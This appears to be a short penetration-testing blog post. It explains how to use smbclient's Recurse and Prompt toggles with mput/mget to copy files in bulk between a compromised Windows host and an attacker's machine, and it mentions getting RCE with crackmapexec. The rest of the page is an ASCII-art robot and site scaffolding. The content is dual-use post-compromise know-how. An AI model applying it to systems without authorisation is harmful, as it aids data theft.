<p>It can be a real pain getting files off a Windows machine back on to your local attacking machine and having used crackmapexec for hours getting RCE everywhere it&rsquo;s easy to forget about ol&rsquo; smbclient. But smbclient can be a great companion when downloading and uploading files quickly. Also, knowing how to recursively download and upload helps too. So the tip, type these words (flags) in next time you use smbclient to enable recursive interactivity. These commands toggle so type them in again if you need to disable them as well:</p>
<pre tabindex="0"><code>*   Recurse  # flag to toggle on recursion
*   Prompt   # flag to toggle off prompts
*   mput/mget  # Command used to get and put multiple files
</code></pre><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_______________
</span></span><span style="display:flex;"><span>&lt; Ju$t d0 XYZ~! &gt;
</span></span><span style="display:flex;"><span> ---------------
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">\ </span>    ____________
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\ </span>   |__________|
</span></span><span style="display:flex;"><span>      /           /<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     /           /  <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    /___________/___/|
</span></span><span style="display:flex;"><span>    |          |     |
</span></span><span style="display:flex;"><span>    |  <span style="color:#f92672">==</span><span style="color:#ae81ff">\ </span>/<span style="color:#f92672">==</span> |     |
</span></span><span style="display:flex;"><span>    |   O   O  | <span style="color:#ae81ff">\ \ </span>|
</span></span><span style="display:flex;"><span>    |     &lt;    |  <span style="color:#ae81ff">\ \|</span>
</span></span><span style="display:flex;"><span>   /|          |   <span style="color:#ae81ff">\ \
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  / |  <span style="color:#ae81ff">\_</span>____/ |   / /
</span></span><span style="display:flex;"><span> / /|          |  / /|
</span></span><span style="display:flex;"><span>/<span style="color:#f92672">||</span><span style="color:#ae81ff">\|</span>          | /<span style="color:#f92672">||</span><span style="color:#ae81ff">\/</span>
</span></span><span style="display:flex;"><span>    -------------|   
</span></span><span style="display:flex;"><span>        | |    | |
</span></span><span style="display:flex;"><span>       &lt;__/    <span style="color:#ae81ff">\_</span>_&gt;
</span></span></code></pre></div>
    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/posts/how-to-phish-using-a-jump-box-part-2/">
                  <span class="button__icon">←</span>
                  <span class="button__text">How to Phish Using a Jump Box Part 2</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/posts/kiosk-escapes-pt-3-mexico-edition/">
                  <span class="button__text">Kiosk Escapes Pt. 3 - Mexico Edition!!</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        <script src="https://utteranc.es/client.js"
        repo="clutchisback1/h4cklife.org"
        issue-term="pathname"
        label="general-comment"
	theme="github-dark"
        crossorigin="anonymous"
        async>
</script>




<script>
"use strict";

!function() {
  var t = window.driftt = window.drift = window.driftt || [];
  if (!t.init) {
    if (t.invoked) return void (window.console && console.error && console.error("Drift snippet included twice."));
    t.invoked = !0, t.methods = [ "identify", "config", "track", "reset", "debug", "show", "ping", "page", "hide", "off", "on" ], 
    t.factory = function(e) {
      return function() {
        var n = Array.prototype.slice.call(arguments);
        return n.unshift(e), t.push(n), t;
      };
    }, t.methods.forEach(function(e) {
      t[e] = t.factory(e);
    }), t.load = function(t) {
      var e = 3e5, n = Math.ceil(new Date() / e) * e, o = document.createElement("script");
      o.type = "text/javascript", o.async = !0, o.crossorigin = "anonymous", o.src = "https://js.driftt.com/include/" + n + "/" + t + ".js";
      var i = document.getElementsByTagName("script")[0];
      i.parentNode.insertBefore(o, i);
    };
  }
}();
drift.SNIPPET_VERSION = '0.3.1';
drift.load('2pa2ip2k9udy');
</script>


      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">Copyright 2019 😜</div>
      
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
